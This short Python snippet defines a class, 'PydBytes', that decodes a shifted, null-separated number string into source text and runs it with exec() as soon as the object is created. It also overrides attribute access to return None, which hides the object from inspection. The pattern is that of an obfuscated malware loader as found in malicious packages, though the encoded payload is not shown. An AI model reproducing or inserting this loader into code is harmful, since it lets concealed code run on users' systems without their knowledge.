class PydBytes:
    def __init__(self, bytes, k, *args, **kwargs): exec(''.join([chr(int(i)-k) for i in bytes.split('\x00')]))
    def __getattribute__(self, __name: str): return None